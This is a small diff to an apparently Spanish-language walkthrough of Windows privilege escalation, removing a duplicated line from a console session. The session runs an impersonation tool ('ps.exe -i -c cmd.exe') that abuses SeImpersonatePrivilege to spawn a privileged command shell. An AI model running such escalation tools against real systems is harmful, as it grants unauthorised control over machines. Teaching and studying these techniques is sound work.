@@ -49,7 +49,6 @@ Utilizamos `C:\Windows\Temp` porque es un directorio destinado al almacenamiento
 
 ```
 C:\Windows\Temp>ps.exe -i -c cmd.exe
-ps.exe -i -c cmd.exe
 [+] Found privilege: SeImpersonatePrivilege
 [+] Named pipe listening...
 [+] CreateProcessAsUser() OK
